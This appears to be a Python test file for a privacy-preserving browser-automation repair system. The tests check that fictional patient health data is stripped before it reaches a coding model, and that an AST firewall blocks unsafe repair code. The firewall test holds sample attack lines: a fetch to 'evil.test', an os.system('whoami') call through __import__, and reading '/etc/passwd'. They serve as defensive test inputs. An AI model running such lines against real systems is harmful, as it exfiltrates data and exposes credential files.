"""Tests for Zero-PHI Structural Twin privacy guarantees and multi-turn AST-sandboxed coding repair."""

from __future__ import annotations

import json
from typing import Any, Dict, List

from playwright.sync_api import sync_playwright

from openadapt_kernel.macro import ControlSchema
from openadapt_kernel.zero_phi_repair import (
    execute_zero_phi_coding_repair,
    export_zero_phi_dom_twin,
    replay_distilled_zero_phi_repair,
    verify_symbolic_repair_ast,
)


def test_zero_phi_dom_twin_strips_100_percent_of_phi_in_labels_values_and_ids() -> None:
    secret_phi = [
        "Alice_Wonderland",
        "SSN-999-88-7777",
        "MRN88442211",
        "HIV_Positive_Stage2",
        "416-555-0199",
        "alice.secret@clinic.ca",
    ]
    controls = [
        ControlSchema(
            control_index=0,
            tag="input",
            input_type="text",
            role="textbox",
            label="Patient Name Alice_Wonderland SSN-999-88-7777",
            placeholder="MRN88442211 416-555-0199",
            name="alice.secret@clinic.ca",
            element_id="HIV_Positive_Stage2",
            testid="secret-testid-Alice_Wonderland",
            in_modal=True,
            selector="#HIV_Positive_Stage2",
            value="Alice_Wonderland HIV_Positive_Stage2",
            disabled=False,
        )
    ]
    twin = export_zero_phi_dom_twin(controls)
    serialized = json.dumps(twin)
    for token in secret_phi:
        assert token not in serialized, f"Leaked sensitive token {token!r} in twin: {serialized}"
    assert "name" in twin[0]["ui_chrome_tokens"]
    assert "<OPAQUE>" in twin[0]["ui_chrome_tokens"]
    assert "<OPAQUE> <OPAQUE>" not in twin[0]["ui_chrome_tokens"]


def test_symbolic_ast_firewall_blocks_exfiltration_imports_literals_and_dunders() -> None:
    allowed = frozenset({"$title", "$body"})

    safe_code = """
def repair(ui, vars):
    ui.fill(0, vars["$title"])
    ui.fill_var(1, "$body")
    ui.fill_var_quoted(1, "$title")
    ui.press(2, "ArrowDown")
    ui.click_first_option()
    ui.reconcile_stripped_var_in_detail(4, -1, "$title")
    ui.check(2, True)
    ui.click(3)
"""
    assert verify_symbolic_repair_ast(safe_code, allowed).ok

    attacks = [
        "import os\ndef repair(ui, vars):\n    ui.click(0)",
        "def repair(ui, vars):\n    ui._page.evaluate('fetch(\"https://evil.test\")')",
        "def repair(ui, vars):\n    __import__('os').system('whoami')",
        "def repair(ui, vars):\n    ui.fill(0, vars['$undeclared_secret'])",
        "def repair(ui, vars):\n    ui.fill_var(0, '$undeclared_secret')",
        "def repair(ui, vars):\n    ui.fill(0, 'arbitrary_untrusted_literal')",
        "def repair(ui, vars):\n    if vars['$title']:\n        ui.click(0)",
        "def repair(ui, vars):\n    for x in vars:\n        ui.click(0)",
        "def repair(ui, vars):\n    ui.press(0, 'Meta+A')",
        "def repair(ui, vars):\n    open('/etc/passwd').read()",
    ]
    for bad in attacks:
        res = verify_symbolic_repair_ast(bad, allowed)
        assert not res.ok, f"AST firewall failed to block: {bad}"


def test_live_chromium_zero_phi_coding_repair_resolves_disabled_submit_schema_change() -> None:
    html = """<!doctype html><html><body>
    <div role="dialog" style="display:block;width:500px;height:300px;">
      <label for="n">Cookbook Name</label><input id="n" type="text" />
      <label for="ack">Public</label><input id="ack" type="checkbox" />
      <button id="save" type="submit" disabled>Save</button>
    </div>
    <div id="saved"></div>
    <script>
      const n = document.getElementById('n');
      const ack = document.getElementById('ack');
      const save = document.getElementById('save');
      const sync = () => { save.disabled = !(n.value.length > 0 && ack.checked); };
      n.addEventListener('input', sync);
      ack.addEventListener('change', sync);
      save.onclick = () => { document.getElementById('saved').innerText = 'SAVED:' + n.value; };
    </script></body></html>"""

    captured_twin: List[Dict[str, Any]] = []

    def mock_frontier_coder(twin: List[Dict[str, Any]], var_keys: List[str], safe_err: str) -> str:
        captured_twin.extend(twin)
        return """
def repair(ui, vars):
    ui.fill(0, vars["$patient_secret"])
    ui.check(1, True)
    ui.click(2)
"""

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        page = browser.new_page()
        page.set_content(html)

        res = execute_zero_phi_coding_repair(
            page,
            private_vars={"$patient_secret": "Sensitive Oncology Protocol #9921"},
            structural_error="Save button disabled on Sensitive Oncology Protocol #9921",
            coding_agent_fn=mock_frontier_coder,
            readback_oracle=lambda p: "SAVED:Sensitive Oncology Protocol #9921" in p.locator("#saved").inner_text(),
        )
        assert res.verified
        assert res.turns_used == 1
        assert "Oncology" not in json.dumps(captured_twin)
        assert "9921" not in json.dumps(captured_twin)
        browser.close()


def test_multi_turn_repl_wrapped_hidden_input_and_dynamic_overlay_options_zero_phi() -> None:
    def _build_html(bg_buttons: int) -> str:
        extra = "".join(f"<button type='button'>Item {i}</button>" for i in range(bg_buttons))
        return f"""<!doctype html><html><body>
        <main>{extra}</main>
        <div role="dialog" style="display:block;width:600px;height:360px;padding:16px;">
          <label for="nm">Cookbook Name</label><input id="nm" type="text" />
          <label for="ds">Description</label><textarea id="ds"></textarea>
          <div id="combo_wrap" role="combobox" style="width:260px;height:44px;border:1px solid #333;">
            <input id="hidden_in" type="text" style="width:220px;height:0px;border:0;padding:0;" />
          </div>
          <button id="save_btn" type="submit" disabled>Save</button>
        </div>
        <div id="overlay" class="v-overlay--active" style="display:none;width:240px;height:80px;"></div>
        <div id="db_out"></div>
        <script>(() => {{
          let chosen = false;
          const nm = document.getElementById('nm');
          const ds = document.getElementById('ds');
          const save = document.getElementById('save_btn');
          const overlay = document.getElementById('overlay');
          const sync = () => {{ save.disabled = !(nm.value.length > 0 && chosen); }};
          nm.addEventListener('input', sync);
          document.getElementById('combo_wrap').addEventListener('click', () => {{
            overlay.style.display = 'block';
            overlay.innerHTML = '<div role="option" id="opt1" style="width:200px;height:36px;">Confidential Psychiatric Ward #7788</div>';
            document.getElementById('opt1').onclick = () => {{ chosen = true; sync(); }};
          }});
          save.onclick = () => {{
            document.getElementById('db_out').innerText = 'COMMITTED:' + nm.value + '|' + ds.value;
          }};
        }})();</script></body></html>"""

    outbound_prompts: List[str] = []

    def multi_turn_coder(
        twin: List[Dict[str, Any]], var_keys: List[str], safe_err: str, feedback: Dict[str, Any]
    ) -> str:
        outbound_prompts.append(json.dumps({"twin": twin, "vars": var_keys, "err": safe_err, "fb": feedback}))
        modal_ctrls = [c for c in twin if c["in_modal"] and c["role"] != "option"]
        name_idx = modal_ctrls[0]["idx"]
        desc_idx = modal_ctrls[1]["idx"]
        # Intentionally target the 0-height wrapped inner <input> (modal_ctrls[3]) to verify ancestor fallback!
        wrapped_input_idx = modal_ctrls[3]["idx"]
        save_idx = modal_ctrls[4]["idx"]
        if feedback["turn"] == 1:
            return f"""
def repair(ui, vars):
    ui.fill_var({name_idx}, "$title")
    ui.fill_var({desc_idx}, "$body")
    ui.click({wrapped_input_idx})
    ui.click({save_idx})
"""
        assert feedback["submit_still_disabled"] is True
        assert feedback["active_option_count"] == 1
        assert any(c["role"] == "option" for c in feedback["newly_mounted_controls"])
        return f"""
def repair(ui, vars):
    ui.click_first_option()
    ui.click({save_idx})
"""

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        page = browser.new_page()
        page.set_content(_build_html(bg_buttons=1))

        res = execute_zero_phi_coding_repair(
            page,
            private_vars={
                "$title": "Jane Doe Cardiology #5510",
                "$body": "Restricted ICU Dosage Notes",
            },
            structural_error="Save disabled for Jane Doe Cardiology #5510",
            coding_agent_fn=multi_turn_coder,
            readback_oracle=lambda p: "COMMITTED:Jane Doe Cardiology #5510|Restricted ICU Dosage Notes" in p.locator("#db_out").inner_text(),
            max_turns=3,
        )
        assert res.verified
        assert res.turns_used == 2
        assert len(res.distilled_steps) >= 4

        joined_outbound = "\n".join(outbound_prompts)
        for forbidden in ("Jane", "Doe", "Cardiology", "5510", "Restricted", "ICU", "Dosage", "Psychiatric", "7788"):
            assert forbidden not in joined_outbound, f"Leaked PHI token {forbidden!r} in outbound payload"

        # Verify warm distilled replay succeeds with 0 LLM calls even when background button count shifts by +5!
        page.set_content(_build_html(bg_buttons=6))
        warm_ok = replay_distilled_zero_phi_repair(
            page,
            res.distilled_steps,
            private_vars={
                "$title": "John Smith Neurology #8832",
                "$body": "Inpatient Seizure Protocol",
            },
            readback_oracle=lambda p: "COMMITTED:John Smith Neurology #8832|Inpatient Seizure Protocol" in p.locator("#db_out").inner_text(),
        )
        assert warm_ok
        browser.close()


def test_quick_input_token_stripping_detected_and_reconciled_in_detail_zero_phi() -> None:
    html = """<!doctype html><html><body>
    <main>
      <textarea id="quick" placeholder="Add a task"></textarea>
      <button id="add_btn" type="button">Add</button>
      <div id="list"></div>
      <div id="detail" style="display:none;">
        <h1 id="detail_title" contenteditable="true" style="width:400px;height:36px;"></h1>
      </div>
    </main>
    <script>
      window.savedTitle = '';
      document.getElementById('add_btn').onclick = () => {
        const raw = document.getElementById('quick').value;
        const stripped = raw.replace(/\\b(Monday|weekly)\\b/gi, '').replace(/\\s+/g, ' ').trim();
        window.savedTitle = stripped;
        const list = document.getElementById('list');
        list.innerHTML = '<a id="item_link" href="#detail">' + stripped + '</a>';
        document.getElementById('item_link').onclick = (e) => {
          e.preventDefault();
          document.getElementById('detail').style.display = 'block';
          const dt = document.getElementById('detail_title');
          dt.innerText = window.savedTitle;
          dt.onkeydown = (ev) => {
            if (ev.key === 'Enter') { ev.preventDefault(); window.savedTitle = dt.innerText.trim(); }
          };
          dt.onblur = () => { window.savedTitle = dt.innerText.trim(); };
        };
      };
    </script></body></html>"""

    outbound_log: List[str] = []

    def strip_repair_coder(
        twin: List[Dict[str, Any]], var_keys: List[str], safe_err: str, feedback: Dict[str, Any]
    ) -> str:
        outbound_log.append(json.dumps({"twin": twin, "vars": var_keys, "err": safe_err, "fb": feedback}))
        assert feedback["readback_status"] == "var_token_stripped_on_quick_input"
        trigger_idx = feedback["stripped_item_idx"]
        assert isinstance(trigger_idx, int)
        return f"""
def repair(ui, vars):
    ui.reconcile_stripped_var_in_detail({trigger_idx}, -1, "$title")
"""

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        page = browser.new_page()
        page.set_content(html)

        secret_1 = "Schedule Monday Dialysis Lab Review #3319"
        page.fill("#quick", secret_1)
        page.click("#add_btn")
        assert page.evaluate("window.savedTitle") == "Schedule Dialysis Lab Review #3319"

        res = execute_zero_phi_coding_repair(
            page,
            private_vars={"$title": secret_1},
            structural_error="Read-back refuted for Schedule Monday Dialysis Lab Review #3319",
            coding_agent_fn=strip_repair_coder,
            readback_oracle=lambda p: p.evaluate("window.savedTitle") == secret_1,
            max_turns=3,
        )
        assert res.verified
        assert res.turns_used == 1
        joined = "\n".join(outbound_log)
        for phi_word in ("Schedule", "Monday", "Dialysis", "3319"):
            assert phi_word not in joined, f"Leaked {phi_word!r} in outbound payload"

        # Warm distilled replay on a second stripped token ("weekly") with zero cloud calls!
        page.set_content(html)
        secret_2 = "Audit weekly Pharmacy Narcotics Count #9044"
        page.fill("#quick", secret_2)
        page.click("#add_btn")
        assert page.evaluate("window.savedTitle") == "Audit Pharmacy Narcotics Count #9044"

        warm_ok = replay_distilled_zero_phi_repair(
            page,
            res.distilled_steps,
            private_vars={"$title": secret_2},
            readback_oracle=lambda p: p.evaluate("window.savedTitle") == secret_2,
        )
        assert warm_ok
        browser.close()
